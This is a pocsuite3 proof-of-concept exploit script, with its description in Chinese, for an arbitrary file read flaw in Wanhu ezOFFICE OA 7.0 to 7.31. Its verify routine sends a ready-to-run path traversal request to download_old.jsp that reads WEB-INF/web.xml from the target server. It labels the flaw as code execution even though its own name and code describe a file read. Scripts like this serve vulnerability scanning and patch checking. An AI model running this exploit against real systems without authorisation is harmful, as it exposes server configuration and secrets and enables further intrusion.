from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '万户OA任意文件读取漏洞'
    appName = '万户OA'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Ezoffice系统是一套基于jsp的oa系统，该系统基于J2EE架构技术的三层架构，完全采用B/S体系结构，广泛应用于各个行业。攻击者通过构造恶意请求，利用 download_old.jsp 可直接遍历读取系统上的文件。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "web-app" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)